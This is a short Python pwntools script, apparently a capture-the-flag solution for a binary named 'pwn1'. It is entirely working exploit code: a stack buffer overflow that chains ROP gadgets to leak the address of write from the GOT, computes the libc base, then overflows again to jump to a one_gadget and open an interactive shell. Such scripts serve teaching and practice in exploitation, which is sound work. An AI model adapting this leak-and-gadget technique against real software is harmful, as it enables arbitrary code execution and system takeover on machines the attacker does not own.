from pwn import *

context(os='linux', arch='amd64', log_level='debug')

io = process('./pwn1')
elf = ELF('./pwn1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rsi_r15 = 0x400611
pop_rdi = 0x400613
write = 0x400595

payload = "A"*0x88 + p64(pop_rsi_r15) + p64(elf.got['write'])*2 + p64(write)

io.sendlineafter('welcome~\n', payload)

write_addr = u64(io.recv(8))
io.recv()

libc_addr = write_addr - libc.sym['write']
one_gadget = libc_addr + 0x4527a

print hex(libc.sym['write']), hex(write_addr), hex(libc_addr), hex(one_gadget)

payload = "A"*0x88 + p64(one_gadget)

io.sendline(payload)

io.interactive()
